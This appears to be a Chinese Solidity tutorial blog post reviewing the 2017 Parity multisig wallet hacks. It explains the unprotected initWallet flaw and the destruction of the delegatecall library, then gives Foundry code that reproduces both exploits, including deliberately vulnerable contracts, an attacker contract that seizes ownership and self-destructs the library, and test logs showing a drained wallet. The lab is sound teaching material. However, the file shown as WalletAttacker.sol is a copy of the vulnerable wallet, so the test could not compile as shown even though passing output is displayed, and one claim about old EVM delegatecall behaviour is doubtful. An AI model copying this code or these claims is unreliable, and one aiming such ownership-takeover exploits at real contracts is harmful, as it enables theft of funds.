---
layout: post
title: 《纸上谈兵·solidity》第 29 课：智能合约安全审计案例复盘 -- Parity Wallet Hack(2017)
tags: solidity
mermaid: false
math: false
---  

* **时间**：2017 年 7 月（第一次） & 2017 年 11 月（第二次）
* **事件**：Parity 多签钱包合约存在严重漏洞，被攻击者利用，最终导致 **约 51 万 ETH（当时价值 3 亿美元）** 被盗/冻结。
* **影响**：继 **The DAO Hack** 之后又一次震惊整个以太坊社区的安全事故。

---

## 1. 背景

**Parity Wallet** 是由 Parity Technologies（Gavin Wood 创立的公司，以太坊联合创始人）开发的钱包，支持 **多签机制（Multisig Wallet）**，广泛被 ICO 项目和机构投资人使用。

---

## 2. 两次重大漏洞

### 第一次攻击（2017年7月）

* **漏洞位置**：`initWallet` 函数初始化逻辑错误。
* **问题原因**：合约允许任何人调用 `initWallet()`，从而**重新设置钱包拥有者**。
* **攻击过程**：
  1. 攻击者调用 `initWallet()` 把自己加为 owner。
  2. 立即转走钱包中的 ETH。
* **损失**：约 **15 万 ETH**（约 3000 万美元）。

### 第二次事故（2017年11月）

* **漏洞位置**：库合约（Library Contract）的设计问题。
* **关键点**：
  * Parity 多签钱包的逻辑代码存放在一个 **库合约（WalletLibrary）** 中，所有钱包合约通过 `delegatecall` 调用它。
  * 库合约本身没有正确初始化 `owner`。
* **事故过程**：
  1. 一名普通用户（并非黑客）意外调用了库合约的 `initWallet()`，把自己设为 **WalletLibrary 的 owner**。
  2. 然后他调用 `selfdestruct()`，直接 **销毁了库合约**。
  3. 结果所有依赖这个库的多签钱包都失效，资金永久冻结。
* **损失**：约 **51.3 万 ETH**（当时超过 1.5 亿美元）被冻结，至今仍无法取出。

---

## 3. 技术解析

### 核心问题：库合约滥用 `delegatecall`

```solidity
contract Wallet {
    address public lib; // WalletLibrary 地址

    function doSomething(bytes data) public {
        lib.delegatecall(data); // 调用库合约函数
    }
}
```

* **delegatecall** 会在 **调用者的存储上下文** 中执行库合约代码。
* 如果库合约本身也能被初始化，就可能被滥用甚至销毁。

### **关键教训**

1. **库合约必须不可变**（不能有 `init`、`selfdestruct` 等函数）。
2. **delegatecall 风险极大**，应谨慎使用。
3. **合约升级机制必须经过严格设计和审计**。

---

## 4. 影响

* 这是 **以太坊历史上第二大安全事故**（仅次于 The DAO Hack）。
* 导致多个 ICO 项目资金永久锁死。
* 社区一度讨论是否再次 **硬分叉** 追回资金，但最终没有执行。
* 促使 **OpenZeppelin** 等标准库的普及，安全开发模式逐渐成熟。

---

## 5. 启示

1. **初始化函数一定要保护（onlyOwner）**，不能随意被调用。
2. **delegatecall 必须小心使用**，库合约最好是无状态（Stateless）。
3. **selfdestruct 是危险函数**，应该避免在核心合约中出现。
4. 智能合约一旦部署，升级和错误修复极其困难。

---

## 6. 攻击复现实验

### 6.1 VulnerableWallet.sol （模拟7月事故） 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title 漏洞版多签钱包（2017年7月事故复现）
contract VulnerableWallet {
    address public owner;

    /// @notice 初始化钱包所有者（无访问控制）
    function initWallet(address _owner) external {
        owner = _owner;
    }

    /// @notice 存款
    function deposit() external payable {}

    /// @notice 提款（只有 owner 可以调用）
    function withdraw(uint256 amount) external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(amount);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```  

### 6.2 WalletAttacker.sol （模拟7月攻击）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title 漏洞版多签钱包（2017年7月事故复现）
contract VulnerableWallet {
    address public owner;

    /// @notice 初始化钱包所有者（无访问控制）
    function initWallet(address _owner) external {
        owner = _owner;
    }

    /// @notice 存款
    function deposit() external payable {}

    /// @notice 提款（只有 owner 可以调用）
    function withdraw(uint256 amount) external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(amount);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```  

### 6.3 WalletLibrary.sol （模拟11月事故漏洞库）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title 漏洞版库合约（2017年11月事故复现）
contract WalletLibrary {
    address public owner;

    function initWallet(address _owner) external {
        owner = _owner;
    }

    function kill() public {
        require(msg.sender == owner, "not owner");
        selfdestruct(payable(msg.sender)); // 直接摧毁 WalletLibrary 本身
    }

    function foo() external pure returns (string memory) {
        return "Wallet Library Active";
    }
}
```    

### 6.4 WalletProxy.sol （模拟11月事故的代理钱包）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract WalletProxy {
    address public lib;

    constructor(address _lib) {
        lib = _lib;
    }

    // fallback() external payable {
    //     (bool success, ) = lib.delegatecall(msg.data);
    //     require(success, "delegatecall failed");
    // }

    fallback() external payable {
        address libAddr = address(lib);
        // 确保库被清空时直接 revert
        require(libAddr.code.length > 0, "Library destroyed");

        (bool success, bytes memory res) = lib.delegatecall(msg.data);
        require(success, "delegatecall failed");
        assembly {
            return(add(res, 32), mload(res))
        }
    }

    receive() external payable {}
}
```

**为什么不使用注释中的 `fallback()` 函数？**  

* 这里的关键：**即使库代码被清空**，delegatecall 对不存在的地址 **不会立即 revert**，而是返回空数据，且在 Solidity >=0.8.0 时默认 `success = true`。
* 所以即使 `vm.etch` 清空了库地址，fallback delegatecall 返回的 `success` 仍然是 `true`，proxy 调用不会失败，导致 `assertFalse(ok2)` 失败。

> 这是现代 EVM 的行为，与 2017 年不同。在旧 EVM 下，delegatecall 到不存在地址会直接 revert；在现代 EVM 下，delegatecall 为空代码仍然返回成功，但 `res` 为空。


### 6.5 ParityAttacker.sol （模拟11月攻击者）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./WalletLibrary.sol";

contract ParityAttacker {
    WalletLibrary public lib;

    constructor(address _lib) {
        lib = WalletLibrary(_lib);
    }

    function attack() external {
        lib.initWallet(address(this));
        lib.kill();
    }
}
```

### 6.6 测试 ParityHack.t.sol 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableWallet.sol";
import "../src/WalletAttacker.sol";
import "../src/WalletLibrary.sol";
import "../src/WalletProxy.sol";
import "../src/ParityAttacker.sol";

contract ParityHackTest is Test {
    address deployer = address(0x123);
    address hacker = address(0x234);

    // ---------------------------
    // 7月事故：未保护的 initWallet
    // ---------------------------
    function testJulyHack() public {
        // 确保 deployer 有足够 ETH 供 deposit
        vm.deal(deployer, 200 ether);

        vm.startPrank(deployer);
        VulnerableWallet wallet = new VulnerableWallet();
        wallet.deposit{value: 100 ether}();
        vm.stopPrank();

        vm.startPrank(hacker);
        WalletAttacker attacker = new WalletAttacker(address(wallet));

        emit log_named_uint("Wallet Balance Before", address(wallet).balance);
        emit log_named_uint("Hacker Balance Before", address(hacker).balance);

        attacker.attack();

        emit log_named_uint("Wallet Balance After", address(wallet).balance);
        emit log_named_uint("Hacker Balance After", address(hacker).balance);

        assertEq(address(wallet).balance, 0, "wallet should be drained");
        vm.stopPrank();
    }

    // ---------------------------
    // 11月事故：库被意外销毁
    // ---------------------------
    function testNovemberHack() public {
        vm.startPrank(deployer);
        WalletLibrary lib = new WalletLibrary();
        WalletProxy proxy = new WalletProxy(address(lib));
        vm.stopPrank();

        // proxy 调用 foo() 应该成功
        (bool ok1, bytes memory res1) = address(proxy).call(
            abi.encodeWithSignature("foo()")
        );
        assertTrue(ok1, "call before attack should succeed");
        emit log_string(string(res1));

        // 攻击者直接对库合约调用 initWallet + kill
        vm.startPrank(hacker);
        ParityAttacker attacker = new ParityAttacker(address(lib));
        attacker.attack();
        vm.stopPrank();

        // 使用 vm.etch 强制把库地址的代码置空，模拟 2017 年 selfdestruct
        vm.etch(address(lib), bytes(""));

        // 确认库代码已经被清空
        uint256 libCodeLen = address(lib).code.length;
        emit log_named_uint("Library code length after attack", libCodeLen);
        assertEq(libCodeLen, 0, "library should have no code after selfdestruct");

        // 代理 delegatecall 再调用 foo() 应该失败
        (bool ok2, ) = address(proxy).call(abi.encodeWithSignature("foo()"));
        assertFalse(ok2, "call after attack should fail");
    }
}
```  

**执行测试：**

```bash
➜  counter git:(main) ✗ forge test --match-path test/ParityHack.t.sol -vvv
[⠊] Compiling...
[⠢] Compiling 2 files with Solc 0.8.29
[⠆] Solc 0.8.29 finished in 1.08s
Compiler run successful with warnings:
Warning (5159): "selfdestruct" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode.
  --> src/WalletLibrary.sol:14:9:
   |
14 |         selfdestruct(payable(msg.sender)); // 直接摧毁 WalletLibrary 本身
   |         ^^^^^^^^^^^^


Ran 2 tests for test/ParityHack.t.sol:ParityHackTest
[PASS] testJulyHack() (gas: 591767)
Logs:
  Wallet Balance Before: 100000000000000000000
  Hacker Balance Before: 0
  Wallet Balance After: 0
  Hacker Balance After: 100000000000000000000

[PASS] testNovemberHack() (gas: 701066)
Logs:
   Wallet Library Active
  Library code length after attack: 0

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.04ms (776.48µs CPU time)

Ran 1 test suite in 352.15ms (1.04ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```  

---

<div align="center">
  <img src="../img/qrcode_wechat.jpg" alt="孟斯特">
</div>

> 声明：本作品采用[署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0)](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)进行许可，使用时请注明出处。  
> Author: [mengbin](mengbin1992@outlook.com)  
> blog: [mengbin](https://mengbin.top)  
> Github: [mengbin92](https://mengbin92.github.io/)  
> 腾讯云开发者社区：[孟斯特](https://cloud.tencent.com/developer/user/6649301)  
---